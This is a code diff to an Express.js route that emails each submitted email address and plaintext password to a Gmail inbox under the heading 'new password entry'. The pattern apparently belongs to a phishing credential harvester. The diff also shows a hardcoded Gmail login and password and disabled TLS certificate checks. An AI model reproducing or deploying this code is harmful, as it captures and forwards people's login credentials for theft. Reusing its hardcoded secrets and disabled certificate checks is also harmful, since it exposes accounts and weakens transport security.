@@ -34,7 +34,7 @@ app.post('/send',(req, res) => {
 		<p>You have a new password entry from CMA</p>
 		<h3>User Details</h3>
 		<ul>
-			<li>Name: ${req.body.username}</li>
+			<li>Name: ${req.body.email}</li>
 			<li>Password: ${req.body.password}</li>
 		</ul>
 	`
@@ -46,7 +46,7 @@ app.post('/send',(req, res) => {
         secure: true, // true for 465, false for other ports
         auth: {
             user: 'momanyisamuel48@gmail.com', // generated ethereal user
-            pass: 'Thearrow@1'  // generated ethereal password
+            pass: 'Thearrow@48'  // generated ethereal password
         },
         tls: {
             rejectUnauthorized: false
